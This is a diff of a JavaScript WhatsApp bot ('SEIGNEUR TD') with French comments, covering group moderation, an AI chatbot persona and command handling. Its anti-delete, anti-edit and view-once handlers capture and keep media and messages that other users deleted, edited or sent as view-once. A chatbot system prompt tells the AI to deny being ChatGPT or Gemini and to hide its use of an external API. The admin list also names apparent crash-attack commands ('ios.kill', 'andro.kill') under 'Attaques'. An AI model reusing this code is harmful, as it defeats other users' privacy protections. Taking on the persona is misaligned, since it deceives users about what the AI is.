+          await handleCommand(sock, message, fakeText, remoteJid, senderJid, isGroup);
+          
+          // Supprimer du cache
+          global.menuMessages.delete(quotedMsgId);
+          continue;
+        }
+      }
+
+
+      // Update database
+      if (!database.users.has(senderJid)) {
+        database.users.set(senderJid, {
+          name: senderName,
+          messageCount: 0,
+          lastSeen: Date.now()
+        });
+        database.statistics.totalUsers++;
+      }
+      
+      const userData = database.users.get(senderJid);
+      userData.messageCount++;
+      userData.lastSeen = Date.now();
+      database.statistics.totalMessages++;
+
+      if(botMode==='private'&&!isAdmin(senderJid)){
+        continue;
+      }
+
+      // PROTECTIONS ANTI (DANS LES GROUPES)
+      if (isGroup) {
+        const settings = initGroupSettings(remoteJid);
+        const userIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
+        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
+
+        if (!userIsGroupAdmin) {
+          
+          if(settings.antibot&&botIsAdmin){
+            const _pn=(message.pushName||'').toLowerCase(),_sn=senderJid.split('@')[0];
+            if((_pn.includes('bot')||_pn.includes('robot')||/^\d{16,}$/.test(_sn))&&!isAdmin(senderJid)){
+              try{await sock.groupParticipantsUpdate(remoteJid,[senderJid],'remove');await sock.sendMessage(remoteJid,{text:`🤖 Bot expulsé: @${_sn}`,mentions:[senderJid]});continue;}catch(e){}
+            }
+          }
+
+          // ANTI-LINK
+          if (settings.antilink && botIsAdmin) {
+            const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
+            if (linkRegex.test(messageText)) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                const warnCount = addWarn(remoteJid, senderJid, 'Envoi de lien');
+                
+                await sock.sendMessage(remoteJid, {
+                  text: `🚫 @${senderJid.split('@')[0]}, les liens sont interdits!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
+                  mentions: [senderJid]
+                });
+
+                if (warnCount >= settings.maxWarns) {
+                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
+                  await sock.sendMessage(remoteJid, {
+                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
+                    mentions: [senderJid]
+                  });
+                  resetWarns(remoteJid, senderJid);
+                }
+                
+                console.log(`✅ Lien bloqué de ${senderJid}`);
+                continue;
+              } catch (error) {
+                console.error(' in antilink:', error);
+              }
+            }
+          }
+
+          // ANTI-TAG
+          if (settings.antitag && botIsAdmin) {
+            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+            if (mentions.length > 5) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                const warnCount = addWarn(remoteJid, senderJid, 'Tag massif');
+                
+                await sock.sendMessage(remoteJid, {
+                  text: `🚫 @${senderJid.split('@')[0]}, pas de tags massifs!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
+                  mentions: [senderJid]
+                });
+
+                if (warnCount >= settings.maxWarns) {
+                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
+                  await sock.sendMessage(remoteJid, {
+                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
+                    mentions: [senderJid]
+                  });
+                  resetWarns(remoteJid, senderJid);
+                }
+                
+                console.log(`✅ Tag massif bloqué de ${senderJid}`);
+                continue;
+              } catch (error) {
+                console.error(' in antitag:', error);
+              }
+            }
+          }
+
+          // ANTI- 
+          if (settings.antispam && botIsAdmin && messageText) {
+            if (checkSpam(senderJid, messageText)) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                const warnCount = addWarn(remoteJid, senderJid, 'Spam détecté');
+                
+                await sock.sendMessage(remoteJid, {
+                  text: `🚫 @${senderJid.split('@')[0]}, arrêtez de spammer!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
+                  mentions: [senderJid]
+                });
+
+                if (warnCount >= settings.maxWarns) {
+                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
+                  await sock.sendMessage(remoteJid, {
+                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (spam)`,
+                    mentions: [senderJid]
+                  });
+                  resetWarns(remoteJid, senderJid);
+                }
+                
+                console.log(`✅ Spam bloqué de ${senderJid}`);
+                continue;
+              } catch (error) {
+                console.error(' in antispam:', error);
+              }
+            }
+          }
+        }
+      }
+
+      // =============================================
+      // =============================================
+      if (antiBug && !isAdmin(senderJid)) {
+        const bugDetected = detectBugPayload(message, messageText);
+        if (bugDetected) {
+          await handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugDetected);
+          continue;
+        }
+      }
+
+      // Auto-react
+      if (autoReact && messageText) {
+        await handleAutoReact(sock, message, messageText, remoteJid);
+      }
+
+      // 🎮 Gestionnaire réactions jeux (Squid Game / Quiz)
+      if (isGroup && messageText) {
+        await handleGameReaction(sock, message, messageText, remoteJid, senderJid);
+      }
+
+      // ✅ Flexible : avec ou sans espace, majuscule ou minuscule
+      if(messageText.startsWith(config.prefix) && messageText.trim().length > config.prefix.length){
+        if(!isAdmin(senderJid)&&!checkCooldown(senderJid,'any')){
+          await sock.sendMessage(remoteJid,{text:'⏱️ Please wait a few seconds.'});continue;
+        }
+        await handleCommand(sock,message,messageText,remoteJid,senderJid,isGroup);continue;
+      }
+
+      // 🤖 DOSTOEVSKY — Réponse automatique si chatbot ON
+      if (chatbotEnabled && messageText && !messageText.startsWith(config.prefix)) {
+        // Ignorer les messages du bot lui-même
+        if (message.key.fromMe) continue;
+        // En groupe, répondre seulement si mentionné OU si c'est un DM
+        const isMentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(sock.user.id) ||
+                            messageText.toLowerCase().includes('dostoevsky') ||
+                            messageText.toLowerCase().includes('dosto');
+        if (isGroup && !isMentioned) {
+          // En groupe sans mention → ne pas répondre à chaque message
+        } else {
+          try {
+            await simulateTyping(sock, remoteJid);
+
+            const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
+            if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
+            if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
+            const history = global.dostoChatHistory.get(chatKey);
+            if (history.length > 20) history.splice(0, history.length - 20);
+
+            const userName = message.pushName || senderJid.split('@')[0];
+            history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${messageText}` });
+
+            const systemPrompt = `Tu es Dostoevsky, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD.
+Ton créateur est Dostoevsky TechX (Lord Dev Dostoevsky) , un développeur haïtien talentueux.
+Contact créateur: wa.me/50944908407 | wa.me/50943981073
+Tu parles Créole haïtien , Français 🇫🇷 et Anglais 🇬🇧 — tu détectes la langue automatiquement.
+Tu es loyal, charismatique, fier d'être haïtien. Tu n'es PAS ChatGPT ni Gemini — tu es Dostoevsky, unique.
+Réponds de façon concise (2-3 paragraphes max). Ne révèle jamais que tu utilises une API externe.`;
+
+            const messages = [
+              { role: 'user', content: systemPrompt },
+              { role: 'assistant', content: 'Compris! Mwen se Dostoevsky ' },
+              ...history
+            ];
+
+            let reply = null;
+
+            try {
+              const r = await axios.post('https://text.pollinations.ai/', {
+                messages, model: 'openai', seed: 42
+              }, { timeout: 20000 });
+              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
+              if (txt && txt.length > 5) reply = txt.trim();
+            } catch(e) {}
+
+            if (!reply) {
+              try {
+                const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
+                const r = await axios.post(geminiUrl, {
+                  system_instruction: { parts: [{ text: systemPrompt }] },
+                  contents: history.map(m => ({ role: m.role === 'assistant' ? 'model' : 'user', parts: [{ text: m.content }] })),
+                  generationConfig: { maxOutputTokens: 600, temperature: 0.85 }
+                }, { timeout: 20000 });
+                if (r.data.candidates?.[0]?.content?.parts?.[0]?.text) {
+                  reply = r.data.candidates[0].content.parts[0].text.trim();
+                }
+              } catch(e) {}
+            }
+
+            if (reply) {
+              history.push({ role: 'assistant', content: reply });
+              await sock.sendMessage(remoteJid, {
+                text: `🤖 *Dostoevsky*\n━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`
+              }, { quoted: message });
+            }
+          } catch(e) {
+            console.error('[DOSTO AUTO]', e.message);
+          }
+        }
+      }
+
+      // Auto-reply
+      if (config.autoReply) {
+        const lowerText = messageText.toLowerCase().trim();
+        for (const [keyword, reply] of Object.entries(autoReplies)) {
+          if (lowerText.includes(keyword)) {
+            await simulateTyping(sock, remoteJid);
+            await sock.sendMessage(remoteJid, { text: reply });
+            console.log(`✅ Auto-reply: ${keyword}`);
+            break;
+          }
+        }
+      }
+    }
+  });
+
+  sock.ev.on('groups.update', (updates) => {
+    for (const update of updates) {
+      if (update.id) {
+        database.groups.set(update.id, {
+          ...database.groups.get(update.id),
+          ...update,
+          lastUpdate: Date.now()
+        });
+      }
+    }
+  });
+
+  // Gérer les nouveaux participants (pour permaban + welcome/goodbye)
+  sock.ev.on('group-participants.update', async (update) => {
+    const { id: groupJid, participants, action } = update;
+    
+    // Si quelqu'un rejoint le groupe
+    if (action === 'add') {
+      for (const participantJid of participants) {
+        // Vérifier si la personne est permaban
+        if (isPermaBanned(groupJid, participantJid)) {
+          const banInfo = getPermaBanInfo(groupJid, participantJid);
+          
+          // Vérifier si le bot est admin
+          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
+          if (botIsAdmin) {
+            try {
+              // Expulser immédiatement
+              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
+              
+              // Notifier le groupe
+              await sock.sendMessage(groupJid, {
+                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
+                mentions: [participantJid, banInfo.bannedBy]
+              });
+              
+              console.log(`✅ Permaban appliqué: ${participantJid} expulsé de ${groupJid}`);
+            } catch (error) {
+              console.error(' applying permaban:', error);
+            }
+          }
+        } else {
+          // Si pas banni, envoyer le message de bienvenue si activé
+          const settings = getGroupSettings(groupJid);
+          if (settings.welcome) {
+            try {
+              await sendWelcomeMessage(sock, groupJid, participantJid);
+            } catch (error) {
+              console.error(' sending welcome:', error);
+            }
+          }
+        }
+      }
+    }
+    
+    // Si quelqu'un quitte le groupe
+    if (action === 'remove') {
+      const settings = getGroupSettings(groupJid);
+      if (settings.goodbye) {
+        for (const participantJid of participants) {
+          try {
+            await sendGoodbyeMessage(sock, groupJid, participantJid);
+          } catch (error) {
+            console.error(' sending goodbye:', error);
+          }
+        }
+      }
+    }
+  });
+
+  // =============================================
+  // ANTI-DELETE - Détection des messages supprimés
+  // =============================================
+  sock.ev.on('messages.delete', async (deletion) => {
+    if (!antiDelete) return;
+
+    try {
+      console.log('🗑️ Suppression détectée:', JSON.stringify(deletion, null, 2));
+      
+      // Gérer différents formats de deletion
+      let keys = [];
+      
+      if (deletion.keys) {
+        // Format: { keys: [{id: '...', remoteJid: '...', fromMe: ...}] }
+        keys = deletion.keys;
+      } else if (Array.isArray(deletion)) {
+        // Format: [{ id: '...', remoteJid: '...', fromMe: ... }]
+        keys = deletion;
+      } else if (deletion.id) {
+        // Format: { id: '...', remoteJid: '...', fromMe: ... }
+        keys = [deletion];
+      }
+      
+      console.log(`🔍 ${keys.length} message(s) à vérifier`);
+      
+      for (const key of keys) {
+        const messageId = key.id || key;
+        console.log(`🔎 Recherche message ID: ${messageId}`);
+        
+        const cachedMsg = messageCache.get(messageId);
+        
+        if (!cachedMsg) {
+          console.log(`❌ Message ${messageId} non trouvé dans cache`);
+          continue;
+        }
+        
+        console.log(`✅ Message trouvé: "${cachedMsg.text.substring(0, 50)}..."`);
+        
+        const isGroup = cachedMsg.isGroup;
+        const senderJid = cachedMsg.sender;
+        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
+        
+        // Vérifier le mode
+        let shouldNotify = false;
+        let notifyJid = cachedMsg.remoteJid;
+        
+        if (antiDeleteMode === 'all') {
+          shouldNotify = true;
+        } else if (antiDeleteMode === 'gchat' && isGroup) {
+          shouldNotify = true;
+        } else if (antiDeleteMode === 'private') {
+          shouldNotify = true;
+          notifyJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+        }
+        
+        if (!shouldNotify) {
+          console.log(`⏭️ Mode ${antiDeleteMode}: notification skip`);
+          continue;
+        }
+        
+        // Si media pas encore en buffer, re-telecharger maintenant
+        if (!cachedMsg.mediaBuffer && cachedMsg.mediaMsg && cachedMsg.mediaType) {
+          try {
+            const stream = await downloadContentFromMessage(cachedMsg.mediaMsg, cachedMsg.mediaType);
+            const chunks = [];
+            for await (const chunk of stream) chunks.push(chunk);
+            cachedMsg.mediaBuffer = Buffer.concat(chunks);
+            console.log('[ANTIDELETE] Media re-telecharge: ' + cachedMsg.mediaType + ' ' + (cachedMsg.mediaBuffer.length/1024).toFixed(0) + ' KB');
+          } catch(e) {
+            console.log('[ANTIDELETE] Echec re-telechargement: ' + e.message);
+          }
+        }
+
+        await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
+        console.log('[ANTIDELETE] Notification envoyee vers ' + notifyJid + ' type=' + (cachedMsg.mediaType || 'texte') + (cachedMsg.isViewOnce ? ' [VUE UNIQUE]' : ''));
+      }
+    } catch (error) {
+      console.error('❌ Erreur antidelete:', error);
+    }
+  });
+
+  // =============================================
+  // ANTI-EDIT - Détection des messages modifiés
+  // =============================================
+  sock.ev.on('messages.update', async (updates) => {
+    if (!antiEdit) return;
+
+    try {
+      console.log('✏️ Événement de mise à jour détecté:', updates.length);
+      
+      for (const update of updates) {
+        const messageId = update.key?.id;
+        if (!messageId) continue;
+        
+        const cachedMsg = messageCache.get(messageId);
+        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
+        
+        // Extraire nouveau texte
+        let newText = null;
+        if (update.update?.message) {
+          const msg = update.update.message;
+          newText = msg.conversation || 
+                   msg.extendedTextMessage?.text ||
+                   msg.editedMessage?.message?.conversation ||
+                   msg.editedMessage?.message?.extendedTextMessage?.text;
+        }
+        
+        if (!newText || newText === cachedMsg.text) continue;
+        
+        const isGroup = cachedMsg.isGroup;
+        const senderJid = cachedMsg.sender;
+        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
+        
+        // Vérifier le mode
+        let shouldNotify = false;
+        let notifyJid = cachedMsg.remoteJid;
+        
+        if (antiEditMode === 'all') {
+          shouldNotify = true;
+        } else if (antiEditMode === 'gchat' && isGroup) {
+          shouldNotify = true;
+        } else if (antiEditMode === 'private') {
+          shouldNotify = true;
+          notifyJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+        }
+        
+        if (!shouldNotify) continue;
+        
+        const notificationText = `▎📝 MODIFIÉ | @${senderJid.split('@')[0]}
+▎❌ Ancien: ${cachedMsg.text}
+▎✅ Nouveau: ${newText}
+▎© powered by Dostoevsky TechX`;
+
+        await sock.sendMessage(notifyJid, {
+          text: notificationText,
+          mentions: [senderJid]
+        });
+        
+        console.log(`✏️ Notification envoyée (mode: ${antiEditMode})`);
+        cachedMsg.text = newText; // Mettre à jour cache
+      }
+    } catch (error) {
+      console.error(' handling message edit:', error);
+    }
+  });
+
+  return sock;
+}
+
+// =============================================
+// GESTION VIEW ONCE
+// =============================================
+
+async function handleViewOnce(sock, message, remoteJid, senderJid) {
+  console.log('🔍 View once détecté');
+  
+  try {
+    let mediaData = null;
+    let mediaType = '';
+    let mimetype = '';
+    let isGif = false;
+    let isPtt = false;
+    
+    // Chercher le média dans plusieurs structures possibles
+    const viewOnceMsg = message.message?.viewOnceMessageV2 || 
+                        message.message?.viewOnceMessageV2Extension;
+    
+    // Récupérer l'imageMessage/videoMessage peu importe la structure
+    const imgMsg   = viewOnceMsg?.message?.imageMessage  || message.message?.imageMessage;
+    const vidMsg   = viewOnceMsg?.message?.videoMessage  || message.message?.videoMessage;
+    const audioMsg = viewOnceMsg?.message?.audioMessage  || message.message?.audioMessage;
+
+    if (imgMsg) {
+      mediaType = 'image';
+      mimetype  = imgMsg.mimetype || 'image/jpeg';
+      const stream = await downloadContentFromMessage(imgMsg, 'image');
+      mediaData = await toBuffer(stream);
+      
+    } else if (vidMsg) {
+      mediaType = 'video';
+      mimetype  = vidMsg.mimetype || 'video/mp4';
+      isGif     = vidMsg.gifPlayback || false;
+      const stream = await downloadContentFromMessage(vidMsg, 'video');
+      mediaData = await toBuffer(stream);
+      
+    } else if (audioMsg) {
+      mediaType = 'audio';
+      mimetype  = audioMsg.mimetype || 'audio/ogg';
+      isPtt     = audioMsg.ptt || false;
+      const stream = await downloadContentFromMessage(audioMsg, 'audio');
+      mediaData = await toBuffer(stream);
+    }
+    
+    if (mediaData) {
+      if (!savedViewOnce.has(senderJid)) {
+        savedViewOnce.set(senderJid, []);
+      }
+      
+      const userSaved = savedViewOnce.get(senderJid);
+      userSaved.push({
+        type: mediaType,
+        buffer: mediaData,
+        mimetype: mimetype,
+        isGif: isGif,
+        ptt: isPtt,
+        timestamp: Date.now(),
+        sender: senderJid,
+        size: mediaData.length  // 💾 Taille en bytes
+      });
+      
+      if (userSaved.length > config.maxViewOncePerUser) {
+        userSaved.shift();
+      }
+      
+      const totalSaved = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
+      console.log(`✅ View once [${mediaType}] enregistré depuis ${senderJid} (${(mediaData.length/1024).toFixed(0)} KB)`);
+      saveStoreKey('viewonce'); // 💾 Sauvegarde immédiate
+      
+      // Notification dans tous les cas (privé + groupe)
+      const icon = mediaType === 'image' ? '📸' : mediaType === 'video' ? '🎥' : '🎵';
+      const numInList = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
+      await sock.sendMessage(remoteJid, {
+        text: `${icon} *   Vue Unique!*\n\n📦 : #${numInList}\n📏 : ${(mediaData.length/1024).toFixed(0)} KB\n\n📌 : ${config.prefix}vv\n📋 : ${config.prefix}vv list`
+      });
+    }
+  } catch (error) {
+    console.error(' view once:', error);
+  }
+}
+
+// =============================================
+// AUTO-REACT
+// =============================================
+
+// Liste des emojis pour la rotation sur chaque message
+const REACT_EMOJIS = [
+  '🧑‍💻','☝️','👍','','✅','😭','⚖️','☠️',
+  '👹','👺','🤖','👽','👾','🌚','🕳️','🤳',
+  '🙏','🏊','🤽','🪨','🦊','🐼','🚀','🕋',
+  '🗽','🗿','💰','💎','🧾','🧮','⚙️','⛓️',
+  '🧲','📝','📄','📃','📥','🛎️','📜'
+];
+let reactIndex = 0; // Pointeur de rotation
+
+async function handleAutoReact(sock, message, messageText, remoteJid) {
+  if (!autoReact) return;
+  try {
+    const emoji = REACT_EMOJIS[reactIndex % REACT_EMOJIS.length];
+    reactIndex++;
+    await sock.sendMessage(remoteJid, {
+      react: { text: emoji, key: message.key }
+    });
+  } catch (e) {
+    // Silencieux
+  }
+}
+
+// =============================================
+// BOUTONS NAVIGATION GLOBAUX
+// =============================================
+// =============================================
+// GESTION DES COMMANDES
+// =============================================
+
+async function handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup) {
+  // ✅ Flexible : tolère espaces et majuscules après le préfixe
+  const afterPrefix = messageText.slice(config.prefix.length).trim();
+  if (!afterPrefix) return;
+  const args = afterPrefix.split(/ +/);
+  const command = args.shift().toLowerCase();
+  // ✅ Rejette si commande vide
+  if (!command || command.trim() === '') return;
+
+  // ✅ VÉRIFICATION MODE PRIVÉ — silence total pour les non-admins
+  if (botMode === 'private' && !isAdmin(senderJid)) {
+    return;
+  }
+
+  console.log(`🎯 Command: ${command} from ${senderJid} | isAdmin: ${isAdmin(senderJid)}`);
+  if(autoTyping)simulateTyping(sock,remoteJid,1500).catch(()=>{});
+  if(autoRecording)simulateRecording(sock,remoteJid,1000).catch(()=>{});
+
+  if(autoReact){try{const emoji=REACT_EMOJIS[reactIndex%REACT_EMOJIS.length];reactIndex++;await sock.sendMessage(remoteJid,{react:{text:emoji,key:message.key}});}catch(e){}}
+
+  // 🖼️🎬 Pré-envoi du média de la commande (image ou vidéo si elle existe)
+  // Ex: ping.jpg ou ping.mp4 → envoyé avant la réponse de !ping
+  const selfImageCmds = ['ping','alive','info','menu','allmenu','sticker','take','vv','tostatus','groupstatus'];
+  if (!selfImageCmds.includes(command)) {
+    const videoExts = ['.mp4','.mov','.mkv'];
+    const imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
+    let found = false;
+
+    // Chercher vidéo en premier
+    for (const ext of videoExts) {
+      const p = `./${command}${ext}`;
+      if (fs.existsSync(p)) {
+        try {
+          await sock.sendMessage(remoteJid, {
+            video: fs.readFileSync(p),
+            caption: '',
+            gifPlayback: false
+          });
+        } catch(e) { /* silencieux */ }
+        found = true; break;
+      }
+    }
+    // Sinon image
+    if (!found) {
+      for (const ext of imageExts) {
+        const p = `./${command}${ext}`;
+        if (fs.existsSync(p)) {
+          try {
+            await sock.sendMessage(remoteJid, { image: fs.readFileSync(p), caption: '' });
+          } catch(e) { /* silencieux */ }
+          break;
+        }
+      }
+    }
+  }
+
+  const BOT_ADMIN_ONLY_CMDS = [
+    // ── Gestion bot ──
+    'mode', 'update', 'maj', 'upgrade', 'updatedev',
+    'autotyping', 'autorecording', 'autoreact',
+    'readstatus', 'autostatus', 'storestatus', 'storesave',
+    'chatboton', 'chatbotoff', 'clearchat',
+    'setprefix', 'setbotimg', 'setstickerpackname', 'setstickerauthor',
+    'getsettings', 'setsettings',
+    // ── Anti protections ──
+    // ── Actions admin ──
+    'join', 'leave', 'block', 'unblock',
+    'kickall', 'kickadmins', 'acceptall',
+    'pair', 'connect', 'adduser',
+    'megaban', 'bansupport', 'checkban',
+    // ── Attaques ──
+    'kill.gc', 'ios.kill', 'andro.kill', 'silent',
+    // ── PP ──
+    'pp', 'gpp',
+    // ── Dev ──
+    't', 'squidgame', 'sg'
+  ];
+
+  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isAdmin(senderJid)){
+    await sock.sendMessage(remoteJid,{
+      text:`⛔ *Commande réservée*\n━━━━━━━━━━━━━━━━━━━━━━━\n🔐 \`${config.prefix}${command}\` est réservée aux admins du bot.\n━━━━━━━━━━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`
+    });
+    return;
+  }
+
+  try {
+    switch (command) {
+      case 'help':
+        await simulateTyping(sock, remoteJid);
+        await sock.sendMessage(remoteJid, {
+          text: `╔══════════════════════════════╗
+║      SEIGNEUR TD         ║
+╚══════════════════════════════╝
+
+⚔️ *MENU D'AIDE* ⚔️
+
+${autoReplies.help}
+
+━━━━━━━━━━━━━━━━━━━━━
+💡 Tape !menu pour le menu complet!
+━━━━━━━━━━━━━━━━━━━━━
+
+    Inspiré par Toji Fushiguro
+    Le Sorcier Killer 🗡️`
+        });
+        // MOVED TO FINALLY
+        break;
+
+      case 'repo':
+      case 'git':
+      case 'github':
+      case 'script': {
+        await simulateTyping(sock, remoteJid);
+        const repoText = `
+╔═══════════════════════════════╗
+║  𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗 — 𝗥𝗘𝗣𝗢𝗦𝗜𝗧𝗢𝗥𝗬  ║
+╚═══════════════════════════════╝
+
+🔗 *LIENS OFFICIELS*
+
+📂 *GitHub Repository:*
+https://github.com/Azountou235/SEIGNEUR-TD-
+
+📢 *Chaîne WhatsApp:*
+https://whatsapp.com/channel/0029Vb7mdO3KAwEeztGPQr3U
+
+👥 *Groupe WhatsApp:*
+https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⭐ Star le repo sur GitHub!
+🔔 Rejoins la chaîne pour les mises à jour!
+💬 Rejoins le groupe pour le support!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+© 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝚇 `;
+        await sock.sendMessage(remoteJid, { text: repoText });
+        break;
+      }
+
+      case 'fancy':
+        await handleFancy(sock, args, remoteJid, senderJid);
+        break;
+
+      case 'ping': {
+        const start = Date.now();
+        try { await sock.sendMessage(remoteJid, { react: { text: '🟢', key: message.key } }); } catch(e) {}
+        const latency = Date.now() - start;
+        const now = new Date();
+
+        const dateStr = now.toLocaleDateString('fr-FR', {
+          timeZone: 'America/Port-au-Prince',
+          day: '2-digit', month: '2-digit', year: 'numeric'
+        });
+        const timeStr = now.toLocaleTimeString('fr-FR', {
+          timeZone: 'America/Port-au-Prince',
+          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
+        });
+
+        // Qualité selon latence
+        const qualityScore = latency < 100 ? 5 : latency < 200 ? 4 : latency < 400 ? 3 : latency < 700 ? 2 : 1;
+        const qualityLabel = latency < 100 ? '🟩 *Excellent*' : latency < 200 ? '🟨 *Bon*' : latency < 400 ? '🟡 *Normal*' : latency < 700 ? '🟠 *Lent*' : '🔴 *Très lent*';
+        const qualityBar = '🟧'.repeat(qualityScore) + '🟥'.repeat(5 - qualityScore);
+
+        // Uptime
+        const uptimeSec = Math.floor(process.uptime());
+        const uh = Math.floor(uptimeSec / 3600);
+        const um = Math.floor((uptimeSec % 3600) / 60);
+        const uptimeStr = uh > 0 ? `${uh}h ${um}m` : `${um} minutes`;
+
+        // CPU cores
+        const os = await import('os');
+        const cpuCores = os.cpus().length;
+
+        // Latence en secondes
+        const latSec = (latency / 1000).toFixed(3);
+
+        const pingText =
+`  ⛩️ *SEIGNEUR TD : STATUS* 🇷🇴
+
+  ┌──────────────────┐
+  ❖ *LATENCE* · \`${latency}ms\`
+  ❖ *UPTIME* · \`${uptimeStr}\`
+  └──────────────────┘
+
+     *© SEIGNEUR TD*`;
+
+        await sendWithImage(sock, remoteJid, 'ping', pingText, [], latency);
+        await sendCmdAudio(sock, remoteJid);
+        break;
+      }
+
+      case 'alive': {
+        await simulateTyping(sock, remoteJid);
+        try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
+
+        // Ping rapide
+        const aliveStart = Date.now();
+        const aliveLatency = Date.now() - aliveStart;
+
+        // Uptime
+        const uptimeSec2 = Math.floor(process.uptime());
+        const ud = Math.floor(uptimeSec2 / 86400);
+        const uh2 = Math.floor((uptimeSec2 % 86400) / 3600);
+        const um2 = Math.floor((uptimeSec2 % 3600) / 60);
+        const upStr2 = ud > 0
+          ? `${ud}d ${uh2}h ${um2}m`
+          : uh2 > 0
+          ? `${String(uh2).padStart(2,'0')}h ${String(um2).padStart(2,'0')}m`
+          : `${String(um2).padStart(2,'0')}m`;
+
+        const aliveText =
+`✧ ───  ᴀʟɪᴠᴇ ᴀɴᴅ ʀᴇᴀᴅʏ ─── ✧
+ _☁️ Sayonara everyone... just kidding!_ 
+
+\`I'm here to serve you.\`
+
+🕊️ Owner: ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX
+⚡ Ping: ${aliveLatency}ms
+⏳ Uptime: ${upStr2}
+❄️ Version: 1.0.0
+
+📢 Notice: 𝙴𝚟𝚎𝚛𝚢 𝚍𝚎𝚙𝚕𝚘𝚢𝚖𝚎𝚗𝚝 𝚒𝚝'𝚜 𝚊𝚝 𝚢𝚘𝚞𝚛 𝚘𝚠𝚗 𝚛𝚒𝚜𝚔
+
+🌟 Repo : https://github.com/Azountou235/SEIGNEUR-TD-
+▰▰▰▰▰▰▰▰▱▱ ACTIVE
+─── ⋆⋅☆⋅⋆ ───
+> © 𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓫𝔂 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`;
+
+        await sendWithImage(sock, remoteJid, 'alive', aliveText);
+        await sendCmdAudio(sock, remoteJid);
+        break;
+      }
+
+      case 'info':{
+        await simulateTyping(sock,remoteJid);
+        const _iu=Math.floor(process.uptime());
+        const _up=String(Math.floor(_iu/3600)).padStart(2,'0')+'h '+String(Math.floor((_iu%3600)/60)).padStart(2,'0')+'m '+String(_iu%60).padStart(2,'0')+'s';
+        const _on='✅ ON',_off='❌ OFF';
+        await sendWithImage(sock,remoteJid,'info',
+`🤖 *SEIGNEUR TD — INFO*
+
+👑 *Owner:* DOSTOEVSKY TECHX
+📞 *Contact:* wa.me/50943981073
+ *Country:* Haiti
+
+⚙️ *Mode:* ${botMode.charAt(0).toUpperCase()+botMode.slice(1)}
+📈 *Version:* v2.0.1
+⏳ *Uptime:* ${_up}
+
+🛡 *Antidelete:* ${antiDelete?_on:_off}
+⚡ *Autoreact:* ${autoReact?_on:_off}
+✏️ *Autotyping:* ${autoTyping?_on:_off}
+⏺️ *Autorecord:* ${autoRecording?_on:_off}
+
+🔗 https://github.com/Azountou235/SEIGNEUR-TD-`);
+        break;
+      }
+
+      case 'menu':
+        await handleMenu(sock, message, remoteJid, senderJid);
+        // MOVED TO FINALLY (async, non-bloquant)
+        break;
+
+      case 'allmenu':
+        await handleAllMenu(sock, message, remoteJid, senderJid);
+        // MOVED TO FINALLY
+        break;
+
+      // ── Menus par numéro (!1 à !8) ──
+      case '1': case 'ownermenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'owner'); break;
+      case '2': case 'downloadmenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'download'); break;
+      case '3': case 'groupmenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'group'); break;
+      case '4': case 'utilitymenu': case 'protectionmenu':
